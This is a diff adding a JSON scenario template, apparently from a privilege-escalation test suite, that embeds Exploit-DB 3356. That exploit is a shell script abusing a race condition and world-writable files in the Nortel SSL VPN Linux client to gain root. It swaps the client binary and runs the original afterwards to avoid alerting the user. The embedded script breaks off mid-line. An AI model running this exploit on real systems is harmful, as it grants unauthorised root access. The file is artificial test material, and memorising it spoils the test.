@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_3356",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Nortel SSL VPN Linux Client 6.0.3 - Local Privilege Escalation (OSVDB-33304;CVE-2007-1057)\n\nExploit source code (3356.sh):\n```\n#!/bin/sh\n#\n# Nortel SSL VPN Linux Client race condition\n#\n# Jon Hart <jhart@spoofed.org>\n#\n# The Linux client that is utilized by versions priot to  6.05 of the Nortel\n# SSL VPN appliance suffers from a number of problems that, in combination,\n# allow an unprivileged local user to obtain root privileges.\n#\n# This particular bug is as follows:\n# 1) SSL VPN is initiated from the startNetdirect() javascript call\n# 2) A zip archive is downloaded to the local machine which contains three\n#    binaries necessary for the client: askpass, client, and surun.  This\n#    archive is written to /tmp, chmod'd 777, and then it is extracted into\n#    /tmp/NetClient\n# 3) All of these files are chmod'd world writable by the following java\n#    snippet, which is called on all UNIX client OSs:\n#\n#   protected boolean setPermissions(String file)\n#   {\n#      String command = \"chmod a+xw \" + file;\n#      try\n#      {\n#         Process p = Runtime.getRuntime().exec(command);\n#         p.waitFor();\n#      }\n#      ...\n#   }\n#\n# 4) /tmp/NetClient/surun is executed, which in turn runs\n#    /tmp/NetClient/askpass.  This process aquires the root password, and\n#    then executes /tmp/NetClient/client via /bin/su and the root password.\n#\n# There is clearly a bug in step 2 and 3 whereby files are installed world\n# writable.  The bug I chose to exploit is the race condition in step 4,\n# combined with the insecure permissions of steps 2 and 3, which (IMO),\n# gives root more easily.  The risk here is if you have untrusted accounts\n# on the machine from which you access the Nortel VPN, those accounts can\n# easily gain local root access.\n#\n# The exploit is fairly simple.  Wait for /tmp/NetClient/client to appear,\n# swap it for our \"special version\", and wait for a shell.\n#\n# Notes: a /tmp with nosuid will help mitigate this particular _exploit_,\n# but not the vulnerability.  The same vulnerability also exists in the Mac\n# client.\n#\n# For education and testing purposes only.  Only run this on systems that\n# you maintain/control.\n#\n\ncleanup() {\n   rm -f $TMP_DIR/.*-$$\\..*\n}\n\n\nrun_cmd() {\n   CMD=$@\n   VPN_CLIENT_RUN=`mktemp -t vpn_client_run-$$.XXXXXXXX`\n\n   echo \"Waiting for writable client\"\n   while (true); do\n      if [ -w $CLIENT ]; then\n         OLD_CLIENT=`mktemp -t old_client-$$.XXXXXXXXXX`\n         echo \"Saving old client\"\n         cp $CLIENT $OLD_CLIENT\n         chmod 755 $OLD_CLIENT\n         echo \"Writing new \\\"client\\\"\"\n         echo \"#!/bin/sh\" > $CLIENT\n         echo \"$CMD\" >> $CLIENT\n         echo \"rm -f $VPN_CLIENT_RUN\" >> $CLIENT\n         # ensure the original client gets run so as to\n         # not alert the user\n         echo \"exec $OLD_CLIENT \\$@\" >> $CLIENT\n         break\n      fi\n   done\n\n   SUCCESS=0\n   echo \"Waiting for new client to be run\"\n   while (true); do\n      if [ ! -f $VPN_CLIENT_RUN ]; then\n         SUCCESS=1\n         break\n      else\n         sleep 2\n      fi\n   done\n\n   if [ $SUCCESS == 1 ]; then\n      echo \"Success\"\n      return 0\n   else\n      ech\n```",
+  "cve": "OSVDB-33304;CVE-2007-1057",
+  "exploitdb_id": "3356",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_3356",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
